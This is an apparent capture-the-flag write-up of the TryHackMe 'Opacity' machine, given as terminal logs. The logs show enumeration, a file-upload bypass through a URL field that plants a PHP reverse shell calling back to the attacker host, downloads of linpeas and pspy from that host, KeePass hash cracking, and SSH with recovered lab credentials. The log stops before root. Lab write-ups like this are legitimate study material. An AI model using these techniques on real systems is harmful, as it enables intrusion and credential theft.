----
Opacity is a Boot2Root made for pentesters and cybersecurity enthusiasts.
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/328c078f7c5695439a46ba90ae48aaa0.png)

###  Opacity

 Start Machine

Opacity is an easy machine that can help you in the penetration testing learning process.

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?

_Hint: There are several ways to perform an action; always analyze the behavior of the application._  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.142.194 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.142.194:22
Open 10.10.142.194:80
Open 10.10.142.194:139
Open 10.10.142.194:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 18:49 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:49
Completed NSE at 18:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:49
Completed NSE at 18:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:49
Completed NSE at 18:49, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:49
Completed Parallel DNS resolution of 1 host. at 18:49, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:49
Scanning 10.10.142.194 [4 ports]
Discovered open port 139/tcp on 10.10.142.194
Discovered open port 445/tcp on 10.10.142.194
Discovered open port 80/tcp on 10.10.142.194
Discovered open port 22/tcp on 10.10.142.194
Completed Connect Scan at 18:49, 0.32s elapsed (4 total ports)
Initiating Service scan at 18:49
Scanning 4 services on 10.10.142.194
Completed Service scan at 18:49, 12.22s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.142.194.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:49
Completed NSE at 18:50, 10.03s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:50
Completed NSE at 18:50, 1.53s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:50
Completed NSE at 18:50, 0.00s elapsed
Nmap scan report for 10.10.142.194
Host is up, received user-set (0.32s latency).
Scanned at 2023-04-09 18:49:40 EDT for 25s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa4rFv9bD2hlJ8EgxU6clOj6v7GMUIjfAr7fzckrKGPnvxQA3ikvRKouMMUiYThvvfM7gOORL5sicN3qHS8cmRsLFjQVGyNL6/nb+MyfUJlUYk4WGJYXekoP5CLhwGqH/yKDXzdm1g8LR6afYw8fSehE7FM9AvXMXqvj+/WoC209pWu/s5uy31nBDYYfRP8VG3YEJqMTBgYQIk1RD+Q6qZya1RQDnQx6qLy1jkbrgRU9mnfhizLVsqZyXuoEYdnpGn9ogXi5A0McDmJF3hh0p01+KF2/+GbKjJrGNylgYtU1/W+WAoFSPE41VF7NSXbDRba0WIH5RmS0MDDFTy9tbKB33sG9Ct6bHbpZCFnxBi3toM3oBKYVDfbpbDJr9/zEI1R9ToU7t+RH6V0zrljb/cONTQCANYxESHWVD+zH/yZGO4RwDCou/ytSYCrnjZ6jHjJ9TWVkRpVjR7VAV8BnsS6egCYBOJqybxW2moY86PJLBVkd6r7x4nm19yX4AQPm8=
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqe7rEbmvlsedJwYaZCIdligUJewXWs8mOjEKjVrrY/28XqW/RMZ12+4wJRL3mTaVJ/ftI6Tu9uMbgHs21itQQ=
|   256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSFcnxA8EchrkX6O0RPMOjIUZyyyQT9fM4z4DdCZyA
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   OPACITY<00>          Flags: <unique><active>
|   OPACITY<03>          Flags: <unique><active>
|   OPACITY<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-time: 
|   date: 2023-04-09T22:49:54
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31044/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 35765/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56906/udp): CLEAN (Failed to receive data)
|   Check 4 (port 4711/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:50
Completed NSE at 18:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:50
Completed NSE at 18:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:50
Completed NSE at 18:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.73 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.142.194 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.142.194
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/04/09 19:15:25 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.142.194/css                  (Status: 301) [Size: 312] [--> http://10.10.142.194/css/]
http://10.10.142.194/cloud                (Status: 301) [Size: 314] [--> http://10.10.142.194/cloud/]
http://10.10.142.194/server-status        (Status: 403) [Size: 278]
Progress: 181040 / 220561 (82.08%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/04/09 19:25:05 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ smbmap -u anonymous -H 10.10.142.194
[+] Guest session   	IP: 10.10.142.194:445	Name: 10.10.142.194                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (opacity server (Samba, Ubuntu))
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ enum4linux -a 10.10.142.194               
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Apr  9 19:03:57 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.142.194
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.142.194 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 10.10.142.194 )===============================

Looking up status of 10.10.142.194
	OPACITY         <00> -         B <ACTIVE>  Workstation Service
	OPACITY         <03> -         B <ACTIVE>  Messenger Service
	OPACITY         <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.142.194 )===================================


[+] Server 10.10.142.194 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.142.194 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ==================================( OS information on 10.10.142.194 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.142.194 from srvinfo: 
	OPACITY        Wk Sv PrQ Unx NT SNT opacity server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 =======================================( Users on 10.10.142.194 )=======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.10.142.194 )=================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (opacity server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.142.194

//10.10.142.194/print$	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.142.194/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.10.142.194 )===========================



[+] Attaching to 10.10.142.194 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] OPACITY
	[+] Builtin

[+] Password Info for Domain: OPACITY

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 ======================================( Groups on 10.10.142.194 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.142.194 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\sysadmin (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-1327801453-43412457-3647261475 and logon username '', password ''

S-1-5-21-1327801453-43412457-3647261475-501 OPACITY\nobody (Local User)
S-1-5-21-1327801453-43412457-3647261475-513 OPACITY\None (Domain Group)

 ===============================( Getting printer info for 10.10.142.194 )===============================

No printers returned.


enum4linux complete on Sun Apr  9 19:19:44 2023

┌──(witty㉿kali)-[~/Downloads]
└─$ file filekoth                   
filekoth: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 1350x900, components 3


┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234                                       
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...

Request:
POST /cloud/ HTTP/1.1

Host: 10.10.142.194

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 46

Origin: http://10.10.142.194

Connection: close

Referer: http://10.10.142.194/cloud/

Cookie: PHPSESSID=.....

Upgrade-Insecure-Requests: 1

url=http%3A%2F%2F10.8.19.103%3A1234%2Ffilekoth

Response: 
HTTP/1.1 200 OK

revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?> 

http://10.8.19.103:1234/payload_ivan.php#filehoth.jpg

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.142.194] 39452
SOCKET: Shell has connected! PID: 2880
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@opacity:/var/www/html/cloud/images$ ls
ls
www-data@opacity:/var/www/html/cloud/images$ cd ..
cd ..
www-data@opacity:/var/www/html/cloud$ ls
ls
folder.png  images  index.php  load.gif  storage.php  style.css
www-data@opacity:/var/www/html/cloud$ cd ..
cd ..
www-data@opacity:/var/www/html$ ls
ls
cloud  css  index.php  login.php  logout.php
www-data@opacity:/var/www/html$ cat login.php
cat login.php
<?php session_start(); /* Starts the session */
	
	/* Check Login form submitted */	
	if(isset($_POST['Submit'])){
		/* Define username and associated password array */
		$logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');
		
		/* Check and assign submitted Username and Password to new variable */
		$Username = isset($_POST['Username']) ? $_POST['Username'] : '';
		$Password = isset($_POST['Password']) ? $_POST['Password'] : '';
		
		/* Check Username and Password existence in defined array */		
		if (isset($logins[$Username]) && $logins[$Username] == $Password){
			/* Success: Set session variables and redirect to Protected page  */
			$_SESSION['UserData']['Username']=$logins[$Username];
			header("location:index.php");
			exit;
		} else {
			/*Unsuccessful attempt: Set error message */
			$msg="<span style='color:red'>Invalid Login Details</span>";
		}
	}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Login</title>
<link href="./css/style.css" rel="stylesheet">
</head>
<body>


  

<br>
<form align="center" action="" method="post" name="Login_Form">
  <table width="400" border="0" align="center" cellpadding="5" cellspacing="1" class="Table">
    <?php if(isset($msg)){?>
    <tr>
      <td colspan="2" align="center" valign="top"><?php echo $msg;?></td>
    </tr>
    <?php } ?>
    <tr>
      <td colspan="2" align="left" valign="top"><h3>Login</h3></td>
    </tr>
    <tr>
      <td align="right" valign="top">Username</td>
      <td><input name="Username" type="text" class="Input"></td>
    </tr>
    <tr>
      <td align="right">Password</td>
      <td><input name="Password" type="password" class="Input"></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td><input name="Submit" type="submit" value="Login" class="Button3"></td>
    </tr>
  </table>
</form>
</body>
</html>

administrator:oncloud9

www-data@opacity:/var$ cd backups
cd backups
www-data@opacity:/var/backups$ ls
ls
apt.extended_states.0  apt.extended_states.1.gz  backup.zip
www-data@opacity:/var/backups$ unzip backup.zip
unzip backup.zip
Archive:  backup.zip
checkdir error:  cannot create lib
                 Permission denied
                 unable to process lib/.
error:  cannot create script.php
        Permission denied

www-data@opacity:/home/sysadmin/scripts/lib$ cat backup.inc.php
cat backup.inc.php
<?php


ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');


function zipData($source, $destination) {
	if (extension_loaded('zip')) {
		if (file_exists($source)) {
			$zip = new ZipArchive();
			if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
				$source = realpath($source);
				if (is_dir($source)) {
					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
					foreach ($files as $file) {
						$file = realpath($file);
						if (is_dir($file)) {
							$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
						} else if (is_file($file)) {
							$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
						}
					}
				} else if (is_file($source)) {
					$zip->addFromString(basename($source), file_get_contents($source));
				}
			}
			return $zip->close();
		}
	}
	return false;
}
?>

uhmm

uploading linpeas.sh

www-data@opacity:/opt$ cd /tmp
cd /tmp
www-data@opacity:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
wget http://10.8.19.103:1234/linpeas.sh
--2023-04-09 23:49:54--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.69K   374KB/s    in 2.2s    

2023-04-09 23:49:57 (374 KB/s) - ‘linpeas.sh’ saved [828098/828098]

www-data@opacity:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@opacity:/tmp$ ./linpeas.sh
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...


╔══════════╣ Analyzing Keepass Files (limit 70)
-rwxrwxr-x 1 sysadmin sysadmin 1566 Jul  8  2022 /opt/dataset.kdbx

www-data@opacity:/tmp$ cd /opt
cd /opt
www-data@opacity:/opt$ ls
ls
dataset.kdbx
www-data@opacity:/opt$ file dataset.kdbx
file dataset.kdbx
dataset.kdbx: Keepass password database 2.x KDBX

www-data@opacity:/opt$ python3 -m http.server 
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.19.103 - - [10/Apr/2023 00:16:32] "GET /dataset.kdbx HTTP/1.1" 200 -


┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://10.10.142.194:8000/dataset.kdbx
--2023-04-09 20:16:31--  http://10.10.142.194:8000/dataset.kdbx
Connecting to 10.10.142.194:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1566 (1.5K) [application/octet-stream]
Saving to: ‘dataset.kdbx’

dataset.kdbx         100%[====================>]   1.53K  --.-KB/s    in 0s      

2023-04-09 20:16:32 (20.9 MB/s) - ‘dataset.kdbx’ saved [1566/1566]

https://www.thedutchhacker.com/how-to-crack-a-keepass-database-file/

┌──(witty㉿kali)-[~/Downloads]
└─$ keepass2john dataset.kdbx > hash_opacity

┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_opacity 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)     
1g 0:00:00:18 DONE (2023-04-09 20:18) 0.05491g/s 48.32p/s 48.32c/s 48.32C/s chichi..david1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo apt -y install keepassx

open database and enter the pass then unlock it

sysadmin:Cl0udP4ss40p4city#8700

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh sysadmin@10.10.142.194
The authenticity of host '10.10.142.194 (10.10.142.194)' can't be established.
ED25519 key fingerprint is SHA256:VdW4fa9h5tyPlpiJ8i9kyr+MCvLbz7p4RgOGPbWM7Nw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.142.194' (ED25519) to the list of known hosts.
sysadmin@10.10.142.194's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 10 Apr 2023 12:26:00 AM UTC

  System load:  0.54              Processes:             129
  Usage of /:   57.5% of 8.87GB   Users logged in:       0
  Memory usage: 45%               IPv4 address for eth0: 10.10.142.194
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Feb 22 08:13:43 2023 from 10.0.2.15
sysadmin@opacity:~$ pwd
/home/sysadmin
sysadmin@opacity:~$ ls
local.txt  scripts
sysadmin@opacity:~$ cat local.txt
6661b61b44d234d230d06bf5b3c075e2

sysadmin@opacity:/tmp$ wget http://10.8.19.103:1234/pspy64
--2023-04-10 00:28:51--  http://10.8.19.103:1234/pspy64
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64               100%[====================>]   2.96M  1.12MB/s    in 2.6s    

2023-04-10 00:28:54 (1.12 MB/s) - ‘pspy64’ saved [3104768/3104768]

sysadmin@opacity:/tmp$ chmod +x pspy64
sysadmin@opacity:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/04/10 00:29:16 CMD: UID=1000  PID=27648  | ./pspy64 
2023/04/10 00:29:16 CMD: UID=0     PID=27647  | 
2023/04/10 00:29:16 CMD: UID=0     PID=27646  | 
2023/04/10 00:29:16 CMD: UID=1000  PID=27610  | -bash 
2023/04/10 00:29:16 CMD: UID=1000  PID=27609  | sshd: sysadmin@pts/1 
2023/04/10 00:29:16 CMD: UID=1000  PID=27477  | (sd-pam) 
2023/04/10 00:29:16 CMD: UID=0     PID=27476  | 
2023/04/10 00:29:16 CMD: UID=1000  PID=27475  | /lib/systemd/systemd --user 
2023/04/10 00:29:16 CMD: UID=0     PID=27462  | sshd: sysadmin [priv] 
2023/04/10 00:29:16 CMD: UID=33    PID=27420  | python3 -m http.server 
2023/04/10 00:29:16 CMD: UID=0     PID=27409  | 
2023/04/10 00:29:16 CMD: UID=0     PID=26946  | 
2023/04/10 00:29:16 CMD: UID=0     PID=26444  | 
2023/04/10 00:29:16 CMD: UID=33    PID=13311  | /usr/sbin/apache2 -k start 
2023/04/10 00:29:16 CMD: UID=33    PID=13310  | /usr/sbin/apache2 -k start 
2023/04/10 00:29:16 CMD: UID=33    PID=13309  | /usr/sbin/apache2 -k start 
2023/04/10 00:29:16 CMD: UID=33    PID=13305  | /usr/sbin/apache2 -k start 
